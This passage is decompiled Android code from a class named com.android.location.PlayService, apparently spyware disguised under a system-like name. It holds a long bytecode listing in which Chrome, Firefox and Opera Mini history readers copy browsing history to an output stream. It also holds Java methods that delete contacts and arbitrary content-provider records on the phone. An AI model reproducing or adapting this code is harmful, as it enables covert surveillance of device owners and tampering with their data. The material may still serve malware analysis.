    //   4837: aload 13
    //   4839: astore 10
    //   4841: aload 16
    //   4843: astore 7
    //   4845: aload 14
    //   4847: astore 9
    //   4849: aload 11
    //   4851: ldc_w 3854
    //   4854: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   4857: aload 15
    //   4859: astore 8
    //   4861: aload 13
    //   4863: astore 10
    //   4865: aload 16
    //   4867: astore 7
    //   4869: aload 14
    //   4871: astore 9
    //   4873: bipush 50
    //   4875: putstatic 677	com/android/location/PlayService:iPreventOperaMini	I
    //   4878: goto -1955 -> 2923
    //   4881: aload 16
    //   4883: astore 7
    //   4885: aload 14
    //   4887: astore 9
    //   4889: iconst_1
    //   4890: putstatic 663	com/android/location/PlayService:bNeedUpdateOperaMiniCounter	Z
    //   4893: aload 16
    //   4895: astore 7
    //   4897: aload 14
    //   4899: astore 9
    //   4901: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   4904: putstatic 677	com/android/location/PlayService:iPreventOperaMini	I
    //   4907: goto -1984 -> 2923
    //   4910: aload 15
    //   4912: astore 8
    //   4914: aload 13
    //   4916: astore 10
    //   4918: aload 16
    //   4920: astore 7
    //   4922: aload 14
    //   4924: astore 9
    //   4926: aload_0
    //   4927: getfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   4930: astore 11
    //   4932: aload 11
    //   4934: ifnull -1965 -> 2969
    //   4937: aload 16
    //   4939: astore 7
    //   4941: aload 14
    //   4943: astore 9
    //   4945: new 864	java/lang/StringBuilder
    //   4948: dup
    //   4949: ldc_w 3856
    //   4952: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4955: getstatic 665	com/android/location/PlayService:iChromeCounter	I
    //   4958: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4961: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4964: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4967: aload 16
    //   4969: astore 7
    //   4971: aload 14
    //   4973: astore 9
    //   4975: getstatic 667	com/android/location/PlayService:bNeedUpdateChromeCounter	Z
    //   4978: ifeq +45 -> 5023
    //   4981: aload 16
    //   4983: astore 7
    //   4985: aload 14
    //   4987: astore 9
    //   4989: ldc_w 3858
    //   4992: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4995: aload 16
    //   4997: astore 7
    //   4999: aload 14
    //   5001: astore 9
    //   5003: iconst_0
    //   5004: putstatic 667	com/android/location/PlayService:bNeedUpdateChromeCounter	Z
    //   5007: aload 16
    //   5009: astore 7
    //   5011: aload 14
    //   5013: astore 9
    //   5015: aload_0
    //   5016: getfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   5019: invokevirtual 3859	ru/dtlbox/databasereader/ChromeHistoryReader:update	()Z
    //   5022: pop
    //   5023: aload 16
    //   5025: astore 7
    //   5027: aload 14
    //   5029: astore 9
    //   5031: aload_0
    //   5032: getfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   5035: aload 12
    //   5037: getstatic 665	com/android/location/PlayService:iChromeCounter	I
    //   5040: invokevirtual 3861	ru/dtlbox/databasereader/ChromeHistoryReader:read	(Ljava/io/OutputStream;I)I
    //   5043: istore_2
    //   5044: aload 16
    //   5046: astore 7
    //   5048: aload 14
    //   5050: astore 9
    //   5052: new 864	java/lang/StringBuilder
    //   5055: dup
    //   5056: ldc_w 3863
    //   5059: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5062: iload_2
    //   5063: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5066: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5069: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5072: aload 16
    //   5074: astore 7
    //   5076: aload 14
    //   5078: astore 9
    //   5080: iload_2
    //   5081: getstatic 665	com/android/location/PlayService:iChromeCounter	I
    //   5084: if_icmpeq +68 -> 5152
    //   5087: aload 16
    //   5089: astore 7
    //   5091: aload 14
    //   5093: astore 9
    //   5095: iload_2
    //   5096: putstatic 665	com/android/location/PlayService:iChromeCounter	I
    //   5099: goto -2130 -> 2969
    //   5102: astore 11
    //   5104: aload 15
    //   5106: astore 8
    //   5108: aload 13
    //   5110: astore 10
    //   5112: aload 16
    //   5114: astore 7
    //   5116: aload 14
    //   5118: astore 9
    //   5120: aload 11
    //   5122: ldc_w 3865
    //   5125: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   5128: aload 15
    //   5130: astore 8
    //   5132: aload 13
    //   5134: astore 10
    //   5136: aload 16
    //   5138: astore 7
    //   5140: aload 14
    //   5142: astore 9
    //   5144: bipush 50
    //   5146: putstatic 675	com/android/location/PlayService:iPreventChrome	I
    //   5149: goto -2180 -> 2969
    //   5152: aload 16
    //   5154: astore 7
    //   5156: aload 14
    //   5158: astore 9
    //   5160: iconst_1
    //   5161: putstatic 667	com/android/location/PlayService:bNeedUpdateChromeCounter	Z
    //   5164: aload 16
    //   5166: astore 7
    //   5168: aload 14
    //   5170: astore 9
    //   5172: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   5175: putstatic 675	com/android/location/PlayService:iPreventChrome	I
    //   5178: goto -2209 -> 2969
    //   5181: aload 15
    //   5183: astore 8
    //   5185: aload 13
    //   5187: astore 10
    //   5189: aload 16
    //   5191: astore 7
    //   5193: aload 14
    //   5195: astore 9
    //   5197: aload_0
    //   5198: getfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   5201: astore 11
    //   5203: aload 11
    //   5205: ifnull -2190 -> 3015
    //   5208: aload 16
    //   5210: astore 7
    //   5212: aload 14
    //   5214: astore 9
    //   5216: new 864	java/lang/StringBuilder
    //   5219: dup
    //   5220: ldc_w 3867
    //   5223: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5226: getstatic 669	com/android/location/PlayService:iFirefoxCounter	I
    //   5229: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5232: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5235: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5238: aload 16
    //   5240: astore 7
    //   5242: aload 14
    //   5244: astore 9
    //   5246: getstatic 671	com/android/location/PlayService:bNeedUpdateFirefoxCounter	Z
    //   5249: ifeq +45 -> 5294
    //   5252: aload 16
    //   5254: astore 7
    //   5256: aload 14
    //   5258: astore 9
    //   5260: ldc_w 3869
    //   5263: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5266: aload 16
    //   5268: astore 7
    //   5270: aload 14
    //   5272: astore 9
    //   5274: iconst_0
    //   5275: putstatic 671	com/android/location/PlayService:bNeedUpdateFirefoxCounter	Z
    //   5278: aload 16
    //   5280: astore 7
    //   5282: aload 14
    //   5284: astore 9
    //   5286: aload_0
    //   5287: getfield 1053	com/android/location/PlayService:mFirefoxHistoryReader	Lru/dtlbox/databasereader/FirefoxHistoryReader;
    //   5290: invokevirtual 3870	ru/dtlbox/databasereader/FirefoxHistoryReader:update	()Z
    //   5293: pop
    //   5294: aload 16
    //   5296: astore 7
    //   5298: aload 14
    //   5300: astore 9
    //   5302: aload_0
    //   5303: getfield 1053	com/android/location/PlayService:mFirefoxHistoryReader	Lru/dtlbox/databasereader/FirefoxHistoryReader;
    //   5306: aload 12
    //   5308: getstatic 669	com/android/location/PlayService:iFirefoxCounter	I
    //   5311: invokevirtual 3871	ru/dtlbox/databasereader/FirefoxHistoryReader:read	(Ljava/io/OutputStream;I)I
    //   5314: istore_2
    //   5315: aload 16
    //   5317: astore 7
    //   5319: aload 14
    //   5321: astore 9
    //   5323: new 864	java/lang/StringBuilder
    //   5326: dup
    //   5327: ldc_w 3873
    //   5330: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5333: iload_2
    //   5334: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5337: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5340: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5343: aload 16
    //   5345: astore 7
    //   5347: aload 14
    //   5349: astore 9
    //   5351: iload_2
    //   5352: getstatic 669	com/android/location/PlayService:iFirefoxCounter	I
    //   5355: if_icmpeq +68 -> 5423
    //   5358: aload 16
    //   5360: astore 7
    //   5362: aload 14
    //   5364: astore 9
    //   5366: iload_2
    //   5367: putstatic 669	com/android/location/PlayService:iFirefoxCounter	I
    //   5370: goto -2355 -> 3015
    //   5373: astore 11
    //   5375: aload 15
    //   5377: astore 8
    //   5379: aload 13
    //   5381: astore 10
    //   5383: aload 16
    //   5385: astore 7
    //   5387: aload 14
    //   5389: astore 9
    //   5391: aload 11
    //   5393: ldc_w 3875
    //   5396: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   5399: aload 15
    //   5401: astore 8
    //   5403: aload 13
    //   5405: astore 10
    //   5407: aload 16
    //   5409: astore 7
    //   5411: aload 14
    //   5413: astore 9
    //   5415: bipush 50
    //   5417: putstatic 673	com/android/location/PlayService:iPreventFirefox	I
    //   5420: goto -2405 -> 3015
    //   5423: aload 16
    //   5425: astore 7
    //   5427: aload 14
    //   5429: astore 9
    //   5431: iconst_1
    //   5432: putstatic 671	com/android/location/PlayService:bNeedUpdateFirefoxCounter	Z
    //   5435: aload 16
    //   5437: astore 7
    //   5439: aload 14
    //   5441: astore 9
    //   5443: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   5446: putstatic 673	com/android/location/PlayService:iPreventFirefox	I
    //   5449: goto -2434 -> 3015
    //   5452: astore_1
    //   5453: iconst_0
    //   5454: ireturn
    //   5455: astore 7
    //   5457: goto -1413 -> 4044
    //   5460: astore 7
    //   5462: goto -1408 -> 4054
    //   5465: astore 6
    //   5467: goto -1403 -> 4064
    //   5470: astore 6
    //   5472: goto -1296 -> 4176
    //   5475: astore 6
    //   5477: goto -1291 -> 4186
    //   5480: astore 6
    //   5482: goto -1286 -> 4196
    //   5485: astore 6
    //   5487: goto -1281 -> 4206
    //   5490: astore 6
    //   5492: goto -1569 -> 3923
    //   5495: astore 6
    //   5497: goto -1564 -> 3933
    //   5500: astore 6
    //   5502: goto -1559 -> 3943
    //   5505: astore_1
    //   5506: aload 7
    //   5508: astore 6
    //   5510: goto -1344 -> 4166
    //   5513: astore 13
    //   5515: aload 19
    //   5517: astore 6
    //   5519: aload 11
    //   5521: astore 12
    //   5523: aload 18
    //   5525: astore_1
    //   5526: aload 17
    //   5528: astore 11
    //   5530: goto -1519 -> 4011
    //   5533: iconst_0
    //   5534: ireturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	5535	0	this	PlayService
    //   0	5535	1	paramString	String
    //   11	5356	2	i	int
    //   36	4029	3	j	int
    //   1781	3043	4	l	long
    //   95	4077	6	localObject1	Object
    //   5465	1	6	localIOException1	IOException
    //   5470	1	6	localIOException2	IOException
    //   5475	1	6	localIOException3	IOException
    //   5480	1	6	localIOException4	IOException
    //   5485	1	6	localIOException5	IOException
    //   5490	1	6	localIOException6	IOException
    //   5495	1	6	localIOException7	IOException
    //   5500	1	6	localIOException8	IOException
    //   5508	10	6	localObject2	Object
    //   41	5397	7	localObject3	Object
    //   5455	1	7	localIOException9	IOException
    //   5460	47	7	localIOException10	IOException
    //   83	5319	8	localObject4	Object
    //   79	5363	9	localObject5	Object
    //   75	5331	10	localObject6	Object
    //   38	4363	11	localObject7	Object
    //   4565	19	11	localException1	Exception
    //   4664	3	11	localOperaMiniHistoryReader	OperaMiniHistoryReader
    //   4831	19	11	localException2	Exception
    //   4930	3	11	localChromeHistoryReader1	ChromeHistoryReader
    //   5102	19	11	localException3	Exception
    //   5201	3	11	localChromeHistoryReader2	ChromeHistoryReader
    //   5373	147	11	localException4	Exception
    //   5528	1	11	localObject8	Object
    //   44	5478	12	localObject9	Object
    //   71	3899	13	arrayOfByte1	byte[]
    //   3994	1410	13	localException5	Exception
    //   5513	1	13	localException6	Exception
    //   65	5375	14	localObject10	Object
    //   59	5341	15	localCRC32	java.util.zip.CRC32
    //   53	5383	16	arrayOfByte2	byte[]
    //   47	5480	17	localObject11	Object
    //   62	5462	18	localObject12	Object
    //   50	5466	19	localObject13	Object
    //   56	218	20	localObject14	Object
    //   68	214	21	localObject15	Object
    //   24	4252	22	arrayOfByte3	byte[]
    //   128	139	23	arrayOfByte4	byte[]
    // Exception table:
    //   from	to	target	type
    //   320	326	3994	java/lang/Exception
    //   342	348	3994	java/lang/Exception
    //   364	372	3994	java/lang/Exception
    //   388	395	3994	java/lang/Exception
    //   411	419	3994	java/lang/Exception
    //   435	449	3994	java/lang/Exception
    //   465	499	3994	java/lang/Exception
    //   515	521	3994	java/lang/Exception
    //   537	543	3994	java/lang/Exception
    //   559	567	3994	java/lang/Exception
    //   583	591	3994	java/lang/Exception
    //   610	619	3994	java/lang/Exception
    //   635	643	3994	java/lang/Exception
    //   661	670	3994	java/lang/Exception
    //   686	720	3994	java/lang/Exception
    //   736	742	3994	java/lang/Exception
    //   758	764	3994	java/lang/Exception
    //   780	788	3994	java/lang/Exception
    //   804	812	3994	java/lang/Exception
    //   831	840	3994	java/lang/Exception
    //   856	864	3994	java/lang/Exception
    //   882	891	3994	java/lang/Exception
    //   907	941	3994	java/lang/Exception
    //   957	979	3994	java/lang/Exception
    //   995	1015	3994	java/lang/Exception
    //   1031	1038	3994	java/lang/Exception
    //   1054	1063	3994	java/lang/Exception
    //   1079	1085	3994	java/lang/Exception
    //   1101	1109	3994	java/lang/Exception
    //   1125	1132	3994	java/lang/Exception
    //   1148	1156	3994	java/lang/Exception
    //   1172	1179	3994	java/lang/Exception
    //   1195	1204	3994	java/lang/Exception
    //   1220	1226	3994	java/lang/Exception
    //   1242	1248	3994	java/lang/Exception
    //   1264	1271	3994	java/lang/Exception
    //   1287	1294	3994	java/lang/Exception
    //   1310	1317	3994	java/lang/Exception
    //   1333	1343	3994	java/lang/Exception
    //   1359	1366	3994	java/lang/Exception
    //   1382	1391	3994	java/lang/Exception
    //   1407	1414	3994	java/lang/Exception
    //   1430	1437	3994	java/lang/Exception
    //   1453	1462	3994	java/lang/Exception
    //   1478	1485	3994	java/lang/Exception
    //   1501	1510	3994	java/lang/Exception
    //   1526	1536	3994	java/lang/Exception
    //   1552	1558	3994	java/lang/Exception
    //   1574	1584	3994	java/lang/Exception
    //   1600	1607	3994	java/lang/Exception
    //   1623	1632	3994	java/lang/Exception
    //   1648	1655	3994	java/lang/Exception
    //   1671	1681	3994	java/lang/Exception
    //   1697	1706	3994	java/lang/Exception
    //   1722	1729	3994	java/lang/Exception
    //   1745	1754	3994	java/lang/Exception
    //   1770	1783	3994	java/lang/Exception
    //   1808	1817	3994	java/lang/Exception
    //   1833	1838	3994	java/lang/Exception
    //   1854	1857	3994	java/lang/Exception
    //   1873	1879	3994	java/lang/Exception
    //   1895	1904	3994	java/lang/Exception
    //   1920	1942	3994	java/lang/Exception
    //   1958	1971	3994	java/lang/Exception
    //   1987	2008	3994	java/lang/Exception
    //   2033	2042	3994	java/lang/Exception
    //   2058	2063	3994	java/lang/Exception
    //   2079	2101	3994	java/lang/Exception
    //   2117	2120	3994	java/lang/Exception
    //   2136	2145	3994	java/lang/Exception
    //   2161	2170	3994	java/lang/Exception
    //   2186	2208	3994	java/lang/Exception
    //   2224	2228	3994	java/lang/Exception
    //   2244	2250	3994	java/lang/Exception
    //   2270	2292	3994	java/lang/Exception
    //   2308	2312	3994	java/lang/Exception
    //   2328	2341	3994	java/lang/Exception
    //   2364	2373	3994	java/lang/Exception
    //   2389	2410	3994	java/lang/Exception
    //   2426	2431	3994	java/lang/Exception
    //   2447	2450	3994	java/lang/Exception
    //   2466	2476	3994	java/lang/Exception
    //   2492	2499	3994	java/lang/Exception
    //   2515	2524	3994	java/lang/Exception
    //   2540	2546	3994	java/lang/Exception
    //   2562	2568	3994	java/lang/Exception
    //   2584	2594	3994	java/lang/Exception
    //   2610	2619	3994	java/lang/Exception
    //   2635	2642	3994	java/lang/Exception
    //   2658	2672	3994	java/lang/Exception
    //   2688	2695	3994	java/lang/Exception
    //   2711	2725	3994	java/lang/Exception
    //   2741	2748	3994	java/lang/Exception
    //   2764	2778	3994	java/lang/Exception
    //   2794	2801	3994	java/lang/Exception
    //   2817	2831	3994	java/lang/Exception
    //   2847	2853	3994	java/lang/Exception
    //   2869	2877	3994	java/lang/Exception
    //   2893	2899	3994	java/lang/Exception
    //   2915	2923	3994	java/lang/Exception
    //   2939	2945	3994	java/lang/Exception
    //   2961	2969	3994	java/lang/Exception
    //   2985	2991	3994	java/lang/Exception
    //   3007	3015	3994	java/lang/Exception
    //   3031	3041	3994	java/lang/Exception
    //   3057	3063	3994	java/lang/Exception
    //   3079	3101	3994	java/lang/Exception
    //   3117	3123	3994	java/lang/Exception
    //   3139	3148	3994	java/lang/Exception
    //   3164	3173	3994	java/lang/Exception
    //   3189	3195	3994	java/lang/Exception
    //   3211	3218	3994	java/lang/Exception
    //   3234	3238	3994	java/lang/Exception
    //   3254	3263	3994	java/lang/Exception
    //   3279	3288	3994	java/lang/Exception
    //   3304	3309	3994	java/lang/Exception
    //   3325	3330	3994	java/lang/Exception
    //   3346	3349	3994	java/lang/Exception
    //   3365	3372	3994	java/lang/Exception
    //   3388	3394	3994	java/lang/Exception
    //   3410	3415	3994	java/lang/Exception
    //   3431	3436	3994	java/lang/Exception
    //   3452	3457	3994	java/lang/Exception
    //   3473	3484	3994	java/lang/Exception
    //   3500	3524	3994	java/lang/Exception
    //   3540	3549	3994	java/lang/Exception
    //   3565	3579	3994	java/lang/Exception
    //   3595	3615	3994	java/lang/Exception
    //   3631	3639	3994	java/lang/Exception
    //   3655	3664	3994	java/lang/Exception
    //   3680	3693	3994	java/lang/Exception
    //   3709	3722	3994	java/lang/Exception
    //   3738	3758	3994	java/lang/Exception
    //   3774	3783	3994	java/lang/Exception
    //   3797	3803	3994	java/lang/Exception
    //   3817	3830	3994	java/lang/Exception
    //   3844	3850	3994	java/lang/Exception
    //   3864	3872	3994	java/lang/Exception
    //   3886	3893	3994	java/lang/Exception
    //   3907	3913	3994	java/lang/Exception
    //   3981	3991	3994	java/lang/Exception
    //   4095	4099	3994	java/lang/Exception
    //   4118	4125	3994	java/lang/Exception
    //   4144	4154	3994	java/lang/Exception
    //   4224	4228	3994	java/lang/Exception
    //   4247	4254	3994	java/lang/Exception
    //   4273	4283	3994	java/lang/Exception
    //   4309	4314	3994	java/lang/Exception
    //   4330	4352	3994	java/lang/Exception
    //   4371	4375	3994	java/lang/Exception
    //   4394	4400	3994	java/lang/Exception
    //   4583	4591	3994	java/lang/Exception
    //   4607	4612	3994	java/lang/Exception
    //   4660	4666	3994	java/lang/Exception
    //   4849	4857	3994	java/lang/Exception
    //   4873	4878	3994	java/lang/Exception
    //   4926	4932	3994	java/lang/Exception
    //   5120	5128	3994	java/lang/Exception
    //   5144	5149	3994	java/lang/Exception
    //   5197	5203	3994	java/lang/Exception
    //   5391	5399	3994	java/lang/Exception
    //   5415	5420	3994	java/lang/Exception
    //   4070	4074	4076	java/io/IOException
    //   320	326	4157	finally
    //   342	348	4157	finally
    //   364	372	4157	finally
    //   388	395	4157	finally
    //   411	419	4157	finally
    //   435	449	4157	finally
    //   465	499	4157	finally
    //   515	521	4157	finally
    //   537	543	4157	finally
    //   559	567	4157	finally
    //   583	591	4157	finally
    //   610	619	4157	finally
    //   635	643	4157	finally
    //   661	670	4157	finally
    //   686	720	4157	finally
    //   736	742	4157	finally
    //   758	764	4157	finally
    //   780	788	4157	finally
    //   804	812	4157	finally
    //   831	840	4157	finally
    //   856	864	4157	finally
    //   882	891	4157	finally
    //   907	941	4157	finally
    //   957	979	4157	finally
    //   995	1015	4157	finally
    //   1031	1038	4157	finally
    //   1054	1063	4157	finally
    //   1079	1085	4157	finally
    //   1101	1109	4157	finally
    //   1125	1132	4157	finally
    //   1148	1156	4157	finally
    //   1172	1179	4157	finally
    //   1195	1204	4157	finally
    //   1220	1226	4157	finally
    //   1242	1248	4157	finally
    //   1264	1271	4157	finally
    //   1287	1294	4157	finally
    //   1310	1317	4157	finally
    //   1333	1343	4157	finally
    //   1359	1366	4157	finally
    //   1382	1391	4157	finally
    //   1407	1414	4157	finally
    //   1430	1437	4157	finally
    //   1453	1462	4157	finally
    //   1478	1485	4157	finally
    //   1501	1510	4157	finally
    //   1526	1536	4157	finally
    //   1552	1558	4157	finally
    //   1574	1584	4157	finally
    //   1600	1607	4157	finally
    //   1623	1632	4157	finally
    //   1648	1655	4157	finally
    //   1671	1681	4157	finally
    //   1697	1706	4157	finally
    //   1722	1729	4157	finally
    //   1745	1754	4157	finally
    //   1770	1783	4157	finally
    //   1808	1817	4157	finally
    //   1833	1838	4157	finally
    //   1854	1857	4157	finally
    //   1873	1879	4157	finally
    //   1895	1904	4157	finally
    //   1920	1942	4157	finally
    //   1958	1971	4157	finally
    //   1987	2008	4157	finally
    //   2033	2042	4157	finally
    //   2058	2063	4157	finally
    //   2079	2101	4157	finally
    //   2117	2120	4157	finally
    //   2136	2145	4157	finally
    //   2161	2170	4157	finally
    //   2186	2208	4157	finally
    //   2224	2228	4157	finally
    //   2244	2250	4157	finally
    //   2270	2292	4157	finally
    //   2308	2312	4157	finally
    //   2328	2341	4157	finally
    //   2364	2373	4157	finally
    //   2389	2410	4157	finally
    //   2426	2431	4157	finally
    //   2447	2450	4157	finally
    //   2466	2476	4157	finally
    //   2492	2499	4157	finally
    //   2515	2524	4157	finally
    //   2540	2546	4157	finally
    //   2562	2568	4157	finally
    //   2584	2594	4157	finally
    //   2610	2619	4157	finally
    //   2635	2642	4157	finally
    //   2658	2672	4157	finally
    //   2688	2695	4157	finally
    //   2711	2725	4157	finally
    //   2741	2748	4157	finally
    //   2764	2778	4157	finally
    //   2794	2801	4157	finally
    //   2817	2831	4157	finally
    //   2847	2853	4157	finally
    //   2869	2877	4157	finally
    //   2893	2899	4157	finally
    //   2915	2923	4157	finally
    //   2939	2945	4157	finally
    //   2961	2969	4157	finally
    //   2985	2991	4157	finally
    //   3007	3015	4157	finally
    //   3031	3041	4157	finally
    //   3057	3063	4157	finally
    //   3079	3101	4157	finally
    //   3117	3123	4157	finally
    //   3139	3148	4157	finally
    //   3164	3173	4157	finally
    //   3189	3195	4157	finally
    //   3211	3218	4157	finally
    //   3234	3238	4157	finally
    //   3254	3263	4157	finally
    //   3279	3288	4157	finally
    //   3304	3309	4157	finally
    //   3325	3330	4157	finally
    //   3346	3349	4157	finally
    //   3365	3372	4157	finally
    //   3388	3394	4157	finally
    //   3410	3415	4157	finally
    //   3431	3436	4157	finally
    //   3452	3457	4157	finally
    //   3473	3484	4157	finally
    //   3500	3524	4157	finally
    //   3540	3549	4157	finally
    //   3565	3579	4157	finally
    //   3595	3615	4157	finally
    //   3631	3639	4157	finally
    //   3655	3664	4157	finally
    //   3680	3693	4157	finally
    //   3709	3722	4157	finally
    //   3738	3758	4157	finally
    //   3774	3783	4157	finally
    //   3797	3803	4157	finally
    //   3817	3830	4157	finally
    //   3844	3850	4157	finally
    //   3864	3872	4157	finally
    //   3886	3893	4157	finally
    //   3907	3913	4157	finally
    //   3981	3991	4157	finally
    //   4095	4099	4157	finally
    //   4118	4125	4157	finally
    //   4144	4154	4157	finally
    //   4224	4228	4157	finally
    //   4247	4254	4157	finally
    //   4273	4283	4157	finally
    //   4309	4314	4157	finally
    //   4330	4352	4157	finally
    //   4371	4375	4157	finally
    //   4394	4400	4157	finally
    //   4413	4435	4157	finally
    //   4443	4449	4157	finally
    //   4457	4463	4157	finally
    //   4471	4475	4157	finally
    //   4483	4491	4157	finally
    //   4499	4513	4157	finally
    //   4521	4542	4157	finally
    //   4557	4562	4157	finally
    //   4583	4591	4157	finally
    //   4607	4612	4157	finally
    //   4623	4627	4157	finally
    //   4635	4641	4157	finally
    //   4660	4666	4157	finally
    //   4679	4701	4157	finally
    //   4709	4715	4157	finally
    //   4723	4729	4157	finally
    //   4737	4741	4157	finally
    //   4749	4757	4157	finally
    //   4765	4779	4157	finally
    //   4787	4808	4157	finally
    //   4823	4828	4157	finally
    //   4849	4857	4157	finally
    //   4873	4878	4157	finally
    //   4889	4893	4157	finally
    //   4901	4907	4157	finally
    //   4926	4932	4157	finally
    //   4945	4967	4157	finally
    //   4975	4981	4157	finally
    //   4989	4995	4157	finally
    //   5003	5007	4157	finally
    //   5015	5023	4157	finally
    //   5031	5044	4157	finally
    //   5052	5072	4157	finally
    //   5080	5087	4157	finally
    //   5095	5099	4157	finally
    //   5120	5128	4157	finally
    //   5144	5149	4157	finally
    //   5160	5164	4157	finally
    //   5172	5178	4157	finally
    //   5197	5203	4157	finally
    //   5216	5238	4157	finally
    //   5246	5252	4157	finally
    //   5260	5266	4157	finally
    //   5274	5278	4157	finally
    //   5286	5294	4157	finally
    //   5302	5315	4157	finally
    //   5323	5343	4157	finally
    //   5351	5358	4157	finally
    //   5366	5370	4157	finally
    //   5391	5399	4157	finally
    //   5415	5420	4157	finally
    //   5431	5435	4157	finally
    //   5443	5449	4157	finally
    //   4413	4435	4565	java/lang/Exception
    //   4443	4449	4565	java/lang/Exception
    //   4457	4463	4565	java/lang/Exception
    //   4471	4475	4565	java/lang/Exception
    //   4483	4491	4565	java/lang/Exception
    //   4499	4513	4565	java/lang/Exception
    //   4521	4542	4565	java/lang/Exception
    //   4557	4562	4565	java/lang/Exception
    //   4623	4627	4565	java/lang/Exception
    //   4635	4641	4565	java/lang/Exception
    //   4679	4701	4831	java/lang/Exception
    //   4709	4715	4831	java/lang/Exception
    //   4723	4729	4831	java/lang/Exception
    //   4737	4741	4831	java/lang/Exception
    //   4749	4757	4831	java/lang/Exception
    //   4765	4779	4831	java/lang/Exception
    //   4787	4808	4831	java/lang/Exception
    //   4823	4828	4831	java/lang/Exception
    //   4889	4893	4831	java/lang/Exception
    //   4901	4907	4831	java/lang/Exception
    //   4945	4967	5102	java/lang/Exception
    //   4975	4981	5102	java/lang/Exception
    //   4989	4995	5102	java/lang/Exception
    //   5003	5007	5102	java/lang/Exception
    //   5015	5023	5102	java/lang/Exception
    //   5031	5044	5102	java/lang/Exception
    //   5052	5072	5102	java/lang/Exception
    //   5080	5087	5102	java/lang/Exception
    //   5095	5099	5102	java/lang/Exception
    //   5160	5164	5102	java/lang/Exception
    //   5172	5178	5102	java/lang/Exception
    //   5216	5238	5373	java/lang/Exception
    //   5246	5252	5373	java/lang/Exception
    //   5260	5266	5373	java/lang/Exception
    //   5274	5278	5373	java/lang/Exception
    //   5286	5294	5373	java/lang/Exception
    //   5302	5315	5373	java/lang/Exception
    //   5323	5343	5373	java/lang/Exception
    //   5351	5358	5373	java/lang/Exception
    //   5366	5370	5373	java/lang/Exception
    //   5431	5435	5373	java/lang/Exception
    //   5443	5449	5373	java/lang/Exception
    //   3947	3951	5452	java/io/IOException
    //   4039	4044	5455	java/io/IOException
    //   4049	4054	5460	java/io/IOException
    //   4059	4064	5465	java/io/IOException
    //   4171	4176	5470	java/io/IOException
    //   4181	4186	5475	java/io/IOException
    //   4191	4196	5480	java/io/IOException
    //   4201	4206	5485	java/io/IOException
    //   3918	3923	5490	java/io/IOException
    //   3928	3933	5495	java/io/IOException
    //   3938	3943	5500	java/io/IOException
    //   85	97	5505	finally
    //   117	130	5505	finally
    //   150	156	5505	finally
    //   176	185	5505	finally
    //   205	218	5505	finally
    //   238	244	5505	finally
    //   264	273	5505	finally
    //   293	304	5505	finally
    //   4026	4034	5505	finally
    //   85	97	5513	java/lang/Exception
    //   117	130	5513	java/lang/Exception
    //   150	156	5513	java/lang/Exception
    //   176	185	5513	java/lang/Exception
    //   205	218	5513	java/lang/Exception
    //   238	244	5513	java/lang/Exception
    //   264	273	5513	java/lang/Exception
    //   293	304	5513	java/lang/Exception
  }
  
  public int DeletePhoneBookRecord(String paramString)
  {
    if (paramString == null) {}
    for (;;)
    {
      return 0;
      FLOG("try 5 to delete id = " + paramString);
      ArrayList localArrayList = new ArrayList();
      localArrayList.add(ContentProviderOperation.newDelete(ContactsContract.RawContacts.CONTENT_URI).withSelection("contact_id=?", new String[] { paramString }).build());
      try
      {
        paramString = getContentResolver().applyBatch("com.android.contacts", localArrayList);
        if (paramString.length > 0)
        {
          int i = paramString[0].count.intValue();
          return i;
        }
      }
      catch (Exception paramString)
      {
        EXCEPT(paramString, "DeletePhoneBookRecord");
      }
    }
    return 0;
  }
  
  public int DeleteRecord(Uri paramUri, String paramString)
  {
    FLOG("Delete from " + paramUri + " id = " + paramString);
    int i = getContentResolver().delete(paramUri, "_ID=?", new String[] { paramString });
    FLOG("deleted_rows=" + i);
    return i;
  }
  
  public int DeleteRecord(Uri paramUri, String paramString1, String paramString2)
  {
    return getContentResolver().delete(paramUri, paramString1 + "=?", new String[] { paramString2 });
  }
  
  public int DeleteRecord(String paramString1, String paramString2)
  {
    Uri localUri = Uri.parse(paramString1);
    FLOG("Delete from " + paramString1 + " id = " + paramString2);
    int i = getContentResolver().delete(localUri, "_ID=?", new String[] { paramString2 });
    FLOG("deleted_rows=" + i);
    return i;
  }
  
